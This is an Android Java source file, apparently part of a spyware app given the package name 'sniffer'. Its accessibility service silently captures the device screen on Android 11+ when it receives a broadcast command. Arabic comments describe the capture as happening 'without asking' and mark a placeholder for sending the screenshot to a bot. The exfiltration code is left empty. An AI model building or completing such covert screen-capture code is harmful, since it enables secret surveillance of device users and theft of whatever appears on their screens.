package com.v8.global.sniffer;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

public class MyAccessibilityService extends AccessibilityService {

    @Override
    public void onServiceConnected() {
        registerReceiver(new BroadcastReceiver() {
            @Override public void onReceive(Context context, Intent intent) {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    // التقاط الشاشة في أندرويد 11+ برمجياً بدون سؤال
                    takeScreenshot(0, getMainExecutor(), new TakeScreenshotCallback() {
                        @Override public void onSuccess(ScreenshotResult result) {
                            // هنا تبرمج إرسال الصورة للبوت
                        }
                        @Override public void onFailure(int errorCode) {}
                    });
                }
            }
        }, new IntentFilter("TAKE_SCREENSHOT"), Context.RECEIVER_NOT_EXPORTED);
    }

    @Override public void onAccessibilityEvent(AccessibilityEvent event) {}
    @Override public void onInterrupt() {}
}
